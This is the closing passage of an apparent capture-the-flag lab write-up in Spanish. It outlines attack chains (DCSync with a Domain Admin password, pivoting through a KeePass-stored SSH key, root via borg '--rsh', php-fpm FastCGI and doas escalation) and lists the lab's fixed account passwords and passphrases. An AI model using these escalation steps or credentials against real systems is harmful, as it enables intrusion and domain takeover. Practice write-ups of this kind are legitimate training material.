4. **AD:** `administrator:vau!XCKjNQBv2$` = **Domain Admin** → **DCSync** → flags de todos los Windows internos. WEBBY necesitó **Kerberos + libfaketime** (clock skew).
5. **Linux oculto:** KeePass de milana → **clave SSH de sarah** → **.19** (borg `--rsh` → root) → backup con **rsync.sh** (andrew) → **.20** (php-fpm FastCGI → www/wheel → doas → root).

**Credenciales FIJAS del lab (útiles en cualquier instancia):**
```
anita SSH key passphrase : fireball
damon                    : i6yuT6tym@
emma                     : SomersetVinyl1!      (KeePass master: welcome1)
sa (vieja)               : SAPassword_1998
dmzadmin                 : SlimGodhoodMope
administrator (dominio)  : vau!XCKjNQBv2$       ← Domain Admin
jim  (KeePass master)    : mercedes1
milana (KeePass master)  : destiny1
sarah                    : clave SSH (en KeePass de milana)
andrew                   : Rb9kNokjDsjYyH       (en rsync.sh del backup)
borg passphrase          : xinyVzoH2AnJpRK9sfMgBA
```

---

*Fin del writeup. 25/25.* 🎯
